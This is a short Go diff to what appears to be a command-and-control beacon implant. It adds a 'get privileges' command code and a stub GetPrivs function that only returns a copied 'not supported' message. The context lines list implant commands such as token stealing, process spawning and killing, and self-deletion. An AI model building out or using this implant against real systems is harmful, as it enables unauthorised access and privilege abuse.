@@ -73,6 +73,7 @@ const (
 	CMD_TYPE_SPAWN_X86                  = 1
 	CMD_TYPE_EXECUTE                    = 12
 	CMD_TYPE_GETUID                     = 27
+	CMD_TYPE_GET_PRIVS                  = 77
 	CMD_TYPE_STEAL_TOKEN                = 31
 	CMD_TYPE_PS                         = 32
 	CMD_TYPE_KILL                       = 33
@@ -520,5 +521,8 @@ func DeleteSelf() ([]byte, error) {
 }
 
 func HideConsole() ([]byte, error) {
+	return []byte("this platform not supports HideConsole now."), nil
+}
+func GetPrivs(privs []string, stolenToken uintptr) ([]byte, error) {
 	return []byte("this platform not supports HideConsole now."), nil
 }
